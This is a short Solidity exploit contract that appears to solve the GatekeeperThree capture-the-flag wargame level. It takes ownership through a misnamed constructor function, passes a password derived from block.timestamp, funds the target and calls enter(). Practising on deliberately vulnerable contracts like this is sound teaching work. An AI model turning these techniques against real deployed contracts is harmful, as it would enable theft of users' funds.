pragma solidity ^0.8.14;

import {GatekeeperThree, SimpleTrick} from "./Level28.sol";
import {console} from "forge-std/Test.sol";

contract GatekeeperThreeExploit {
    function exploit(address payable _target) external payable {
        GatekeeperThree gatekeeper = GatekeeperThree(_target);
        gatekeeper.construct0r();

        gatekeeper.createTrick();
        SimpleTrick trick = gatekeeper.trick();
        uint256 password = block.timestamp;
        trick.checkPassword(password);

        gatekeeper.getAllowance(password);
        _target.call{value: msg.value}("");

        gatekeeper.enter();
    }
}
